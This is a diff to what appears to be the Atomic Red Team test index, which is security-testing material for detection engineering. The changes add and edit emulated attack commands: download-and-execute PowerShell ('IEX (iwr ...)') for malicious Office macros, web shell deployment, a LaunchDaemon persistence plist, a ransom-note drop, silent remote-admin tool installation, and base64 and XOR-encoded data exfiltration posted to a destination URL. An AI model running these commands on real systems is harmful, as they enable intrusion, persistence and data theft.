+        username:
+          description: Username of the IAM user to create in AWS
+          type: String
+          default: atomicredteam
+      dependencies:
+      - description: 'Check if ~/.aws/credentials file has a default stanza is configured
+
+'
+        prereq_command: 'cat ~/.aws/credentials | grep "default"
+
+'
+        get_prereq_command: 'echo Please install the aws-cli and configure your AWS
+          defult profile using: aws configure
+
+'
+      executor:
+        command: 'aws iam create-user --user-name #{username}
+
+'
+        cleanup_command: 'aws iam delete-user --user-name #{username}
+
+'
+        name: sh
+        elevation_required: false
   T1078.004:
     technique:
       id: attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65
@@ -39603,7 +40002,7 @@ persistence:
           $User.DisplayName = $SamAccountName
           $User.Save()
           $User
-        cleanup_command: 'net user "#{username}" >nul 2>&1 /del /domain
+        cleanup_command: 'cmd /c "net user #{username} /del >nul 2>&1"
 
 '
         name: powershell
@@ -41211,7 +41610,7 @@ persistence:
         command: |
           sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}
           sudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}
-        cleanup: |
+        cleanup_command: |
           sudo launchctl unload /Library/LaunchDaemons/#{plist_filename}
           sudo rm /Library/LaunchDaemons/#{plist_filename}
   T1053.004:
@@ -44321,7 +44720,7 @@ persistence:
 '
       executor:
         command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
-          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
@@ -46120,15 +46519,16 @@ persistence:
         get_prereq_command: |
           New-Item -Type Directory (split-path #{web_shells}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp" -OutFile "#{web_shells}/b.jsp"
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp" -OutFile "#{web_shells}/test.jsp"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp" -OutFile "#{web_shells}/tests.jsp"
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx" -OutFile "#{web_shells}/cmd.aspx"
       executor:
-        command: 'xcopy #{web_shells} #{web_shell_path}
+        command: 'xcopy /I /Y #{web_shells} #{web_shell_path}
 
 '
-        cleanup_command: 'del #{web_shell_path} /q >nul 2>&1
-
-'
+        cleanup_command: |
+          del #{web_shell_path}\b.jsp /q >nul 2>&1
+          del #{web_shell_path}\tests.jsp /q >nul 2>&1
+          del #{web_shell_path}\cmd.aspx /q >nul 2>&1
         name: command_prompt
   T1546.003:
     technique:
@@ -47298,6 +47698,21 @@ impact:
         cleanup_command: |
           $which_openssl rsautl -decrypt -inkey #{private_key_path} -in #{encrypted_file_path}
           rm #{encrypted_file_path}
+    - name: PureLocker Ransom Note
+      auto_generated_guid: 649349c7-9abf-493b-a7a2-b1aa4d141528
+      description: "building the IOC (YOUR_FILES.txt) for the PureLocker ransomware
+        \nhttps://www.bleepingcomputer.com/news/security/purelocker-ransomware-can-lock-files-on-windows-linux-and-macos/\n"
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: 'echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt
+
+'
+        cleanup_command: 'del %USERPROFILE%\Desktop\YOUR_FILES.txt >nul 2>&1
+
+'
   T1565:
     technique:
       external_references:
@@ -51209,7 +51624,7 @@ discovery:
 
 '
         name: bash
-        elevation_require: true
+        elevation_required: true
     - name: Network Share Discovery command prompt
       auto_generated_guid: 20f1097d-81c1-405c-8380-32174d493bbb
       description: |
@@ -51259,6 +51674,18 @@ discovery:
 '
       supported_platforms:
       - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Endpoint must be joined to domain
+
+'
+        prereq_command: 'if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: '"Join system to domain"
+
+'
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -58595,7 +59022,7 @@ execution:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         cleanup_command: 'Remove-Item #{jse_path} -ErrorAction Ignore
@@ -58657,7 +59084,7 @@ execution:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         name: powershell
@@ -58696,7 +59123,7 @@ execution:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         name: powershell
@@ -58734,7 +59161,7 @@ execution:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{bat_path}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $bat_path `", vbNormalFocus)`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}
         name: powershell
@@ -58869,7 +59296,7 @@ execution:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
         name: powershell
     - name: Potentially Unwanted Applications (PUA)
@@ -60089,7 +60516,7 @@ execution:
 '
       executor:
         command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
-          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
@@ -60498,7 +60925,41 @@ execution:
       x_mitre_remote_support: true
       x_mitre_contributors:
       - Shane Tully, @securitygypsy
-    atomic_tests: []
+      identifier: T1072
+    atomic_tests:
+    - name: Radmin Viewer Utility
+      auto_generated_guid: b4988cad-6ed2-434d-ace5-ea2670782129
+      description: 'An adversary may use Radmin Viewer Utility to remotely control
+        Windows device, this will start the radmin console.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        radmin_installer:
+          description: Radmin Viewer installer
+          type: Path
+          default: "%TEMP%\\RadminViewer.msi"
+        radmin_exe:
+          description: The radmin.exe executable from RadminViewer.msi
+          type: Path
+          default: "%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe"
+      dependencies:
+      - description: 'Radmin Viewer Utility must be installed at specified location
+          (#{radmin_exe})
+
+'
+        prereq_command: 'if not exist "#{radmin_exe}" (exit /b 1)
+
+'
+        get_prereq_command: |
+          echo Downloading radmin installer
+          bitsadmin /transfer myDownloadJob /download /priority normal "https://www.radmin.com/download/Radmin_Viewer_3.5.2.1_EN.msi" #{radmin_installer}
+          msiexec /i "#{radmin_installer}" /qn
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: '"#{radmin_exe}"'
   T1153:
     technique:
       id: attack-pattern--45d84c8b-c1e2-474d-a14d-69b5de0a2bc0
@@ -60969,7 +61430,7 @@ execution:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"
         cleanup_command: 'Get-WmiObject win32_process | Where-Object {$_.CommandLine
           -like "*mshta*"}  | % { "$(Stop-Process $_.ProcessID)" } | Out-Null
@@ -61007,7 +61468,7 @@ execution:
 '
       executor:
         command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
-          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\"
           -officeProduct \"Word\" -sub \"Extract\"\n"
         cleanup_command: 'Remove-Item "$env:TEMP\atomic_t1059_005_test_output.bin"
@@ -62852,7 +63313,41 @@ lateral-movement:
       x_mitre_remote_support: true
       x_mitre_contributors:
       - Shane Tully, @securitygypsy
-    atomic_tests: []
+      identifier: T1072
+    atomic_tests:
+    - name: Radmin Viewer Utility
+      auto_generated_guid: b4988cad-6ed2-434d-ace5-ea2670782129
+      description: 'An adversary may use Radmin Viewer Utility to remotely control
+        Windows device, this will start the radmin console.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        radmin_installer:
+          description: Radmin Viewer installer
+          type: Path
+          default: "%TEMP%\\RadminViewer.msi"
+        radmin_exe:
+          description: The radmin.exe executable from RadminViewer.msi
+          type: Path
+          default: "%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe"
+      dependencies:
+      - description: 'Radmin Viewer Utility must be installed at specified location
+          (#{radmin_exe})
+
+'
+        prereq_command: 'if not exist "#{radmin_exe}" (exit /b 1)
+
+'
+        get_prereq_command: |
+          echo Downloading radmin installer
+          bitsadmin /transfer myDownloadJob /download /priority normal "https://www.radmin.com/download/Radmin_Viewer_3.5.2.1_EN.msi" #{radmin_installer}
+          msiexec /i "#{radmin_installer}" /qn
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: '"#{radmin_exe}"'
   T1080:
     technique:
       id: attack-pattern--246fd3c7-f5e3-466d-8787-4c13d9e3b61c
@@ -65823,6 +66318,38 @@ command-and-control:
           echo -n 111-11-1111 | base64
           curl -XPOST #{base64_data}.#{destination_url}
         name: sh
+    - name: XOR Encoded data.
+      auto_generated_guid: c3ed6d2a-e3ad-400d-ad78-bbfdbfeacc08
+      description: |
+        XOR encodes the data with a XOR key.
+        Reference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f
+      supported_platforms:
+      - windows
+      input_arguments:
+        destination_url:
+          description: Destination URL to post encoded data.
+          type: string
+          default: example.com
+        plaintext:
+          description: Plain text mimicking victim data sent to C2 server.
+          type: string
+          default: Path\n----\nC:\Users\victim
+        key:
+          description: XOR key used for encoding the plaintext.
+          type: string
+          default: abcdefghijklmnopqrstuvwxyz123456
+      executor:
+        command: |
+          $plaintext = ([system.Text.Encoding]::UTF8.getBytes("#{plaintext}"))
+          $key = "#{key}"
+          $cyphertext =  @();
+          for ($i = 0; $i -lt $plaintext.Count; $i++) {
+           $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];
+          }
+          $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)
+          [System.Net.ServicePointManager]::Expect100Continue = $false
+          Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive
+        name: powershell
   T1001.002:
     technique:
       external_references:
@@ -68175,7 +68702,7 @@ initial-access:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         cleanup_command: 'Remove-Item #{jse_path} -ErrorAction Ignore
